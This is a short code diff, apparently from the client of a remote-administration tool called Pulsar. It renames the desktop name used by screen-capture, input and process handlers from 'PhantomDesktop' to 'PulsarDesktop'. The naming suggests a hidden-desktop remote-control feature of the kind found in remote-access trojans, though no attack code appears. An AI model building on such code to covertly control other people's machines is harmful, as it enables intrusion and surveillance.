@@ -27,9 +27,9 @@ namespace Pulsar.Client.Messages
         private Thread _captureThread;
         private CancellationTokenSource _cancellationTokenSource;
 
-        private readonly ImageHandler ImageHandler = new ImageHandler("PhantomDesktop");
-        private readonly InputHandler InputHandler = new InputHandler("PhantomDesktop");
-        private readonly ProcessController ProcessHandler = new ProcessController("PhantomDesktop");
+        private readonly ImageHandler ImageHandler = new ImageHandler("PulsarDesktop");
+        private readonly InputHandler InputHandler = new InputHandler("PulsarDesktop");
+        private readonly ProcessController ProcessHandler = new ProcessController("PulsarDesktop");
 
         // frame control variables
         private readonly ConcurrentQueue<byte[]> _frameBuffer = new ConcurrentQueue<byte[]>();
